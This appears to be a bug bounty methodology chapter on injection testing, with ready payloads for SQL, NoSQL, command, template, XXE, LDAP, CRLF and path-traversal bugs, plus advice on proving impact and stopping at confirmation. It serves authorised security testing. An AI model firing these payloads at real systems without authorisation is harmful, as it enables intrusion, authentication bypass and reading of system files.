# 07 — Injection

Injection is when user input becomes part of a command, query, template, or
expression that the server executes. The classic families below are ordered by
how often they pay in bug bounty today.

Golden rule: **a reflected payload is a suspicion; a returned row, a resolved
template, or a delay is a finding.** Do not report "the quote was not escaped".

---

## SQL injection

### Where it hides

- Numeric ids in REST paths: `/api/orders/1042'`
- Sort/filter params: `?sort=name`, `?order=asc`, `?filter[price]`
- Search: `?q=`
- JSON bodies: `{"email":"a' OR 1=1--"}`
- GraphQL arguments (if the resolver concatenates)
- Report/export generators (`?from=2026-01-01'`)
- Hidden legacy params the frontend dropped but the backend still reads

### Detection that does not lie

Use time-based as the confirmation, boolean as the search:

```
' AND 1=1--      vs      ' AND 1=2--
' AND SLEEP(5)--        (MySQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- (Postgres)
```

Three conditions before you call it:

1. The boolean pair changes the response *consistently* over 3 tries.
2. The delay is proportional (5s for SLEEP(5), not a random 5s).
3. The behaviour is absent on a control param.

**Never run `sqlmap` with `--dump` against production.** Detection + one proof
row is the contract. If the program allows `sqlmap`, use `--level=2
--risk=1 --technique=T` and stop at confirmation.

### What proves impact

- `UNION SELECT` returning `version()`, `user()`, `database()` — that is a
  finding.
- Blind boolean extracted one bit (`ASCII(SUBSTRING(...))>77`) — enough, say
  "blind".
- A `SLEEP` that only you can trigger — Medium, not High, unless data access is
  shown.

### Severity reality

Read = High if it returns real data. Auth bypass = High/Critical. Delay-only =
Medium. Reflected error with no data = Info.

---

## NoSQL injection

Mongo/Express apps with `{"$ne": null}` style auth bypass:

```json
{"email": {"$ne": null}, "password": {"$ne": null}}
{"email": {"$regex": "^admin"}, "password": {"$ne": null}}
```

Try in JSON bodies and in query strings with bracket syntax
(`?email[$ne]=x`). A login bypass is Critical.

Array injection: `username[]=admin`. Object injection where the app expects a
string.

---

## Command injection

Look for: image processing, PDF generation, video transcode, `ping`/`nslookup`
tools, "convert this file", "run this report", filename passed to a shell.

```
; id
| id
$(id)
`id`
%0aid
&& id
```

Use an out-of-band listener (`interactsh`, Burp Collaborator) for blind cases —
a DNS hit is proof. Never chain to a destructive command.

---

## SSTI (server-side template injection)

Where: name fields rendered in emails/PDFs, custom "template" features,
report headers, `{{ }}` in any field the app renders server-side.

```
{{7*7}}          → 49 = Jinja/Twig/Nunjucks family
${7*7}           → 49 = Freemarker / JSP EL
<%= 7*7 %>       → 49 = ERB
#{7*7}           → 49 = Ruby / Thymeleaf variants
{{7*'7'}}        → 7777777 = Jinja (string repeat) vs 49 = Twig
```

Escalation (read-only):

```
Jinja:    {{ cycler.__init__.__globals__.os.popen('id').read() }}
Twig:     {{['id']|filter('system')}}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

RCE from SSTI is Critical. Prove with `id` / `whoami` and stop.

---

## XXE

Where: any endpoint that parses XML — SOAP, SAML, RSS import, SVG upload,
DOCX/XLSX upload, "import from URL", sitemap tools.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

Blind version with an external DTD on your listener. If it is a PHP app with
`expect://`, `php://filter` — read a file. A SAML endpoint that accepts external
entities is often Critical.

**Do not** use XXE to read `/etc/shadow` or keys you do not need. `/etc/hostname`
or `win.ini` proves it with less data.

---

## LDAP injection

Where: staff login against AD, "search users", "find employee".

```
*)(uid=*))(|(uid=*
admin)(&)
*))%00
```

Auth bypass via `*)(&` is High. Often excluded as "internal only" — check the
program.

---

## CRLF / header injection

Where: any param that ends up in a response header (redirect, filename,
`Set-Cookie`, `Content-Disposition`).

```
%0d%0aSet-Cookie:admin=1
%0a%0d<script>
```

Response splitting is rare now (most proxies normalize), but header injection
into `Location:` for an open redirect is common. See `09-xss-and-client-side.md`.

---

## Path traversal / file read

See `10-file-handling.md` for the full method. Summary:

```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
..%252f..%252f          (double decode)
/var/www/../../etc/passwd
```

Windows: `..\..\windows\win.ini`, `C:\windows\win.ini`, `file:///c:/windows/win.ini`.

A read of a real system file is High. A read of a file you uploaded is Medium.
A 200 with an empty body is closed.

---

## Template / expression injection in the client

Client-side template injection (Angular, Vue) is a different bug — see
`09-xss-and-client-side.md`. Do not confuse it with SSTI.

---

## Deserialization

Where: `__VIEWSTATE` (ASP.NET), Java `rO0AB` in cookies/params, Python pickle,
PHP `O:`, Node `node-serialize`, YAML `!!java`.

Detection is easy (magic bytes). Exploitation needs a gadget chain — out of scope
for most beginner hunters; report the *existence* of unsafe deserialization of
user input with the magic bytes as evidence, and let triage escalate.

---

## The boolean-lie test

Before you report anything as injection, run the control:

```
param=normal          → 200, normal
param=normal'         → 500, or unchanged
param=normal''        → 200, normal again
```

If `'` and `''` behave the same as `normal`, the input is not reaching a query in
a way that surprises it. If `'` breaks and `''` fixes, you have a candidate — now
find the boolean pair.

---

## What closed looks like

- Parameterised queries → `'` and `''` identical, no delay.
- ORM with typed params → same.
- Input rejected at validation (numbers only, enum) → different error, no query.
- WAF blocks the quote → 403 on `'`, 200 without. That is not a finding; it is a
  filtered surface. Note it and move on.

---

## Reporting injection well

One request, one response, one extraction. Show:

```
POST /api/search
q=x' UNION SELECT version(),user(),database()-- -
→ 200
["8.0.32","app@db","shop"]
```

That is a High, accepted, no questions. A paragraph about "possible SQL
injection" is not.
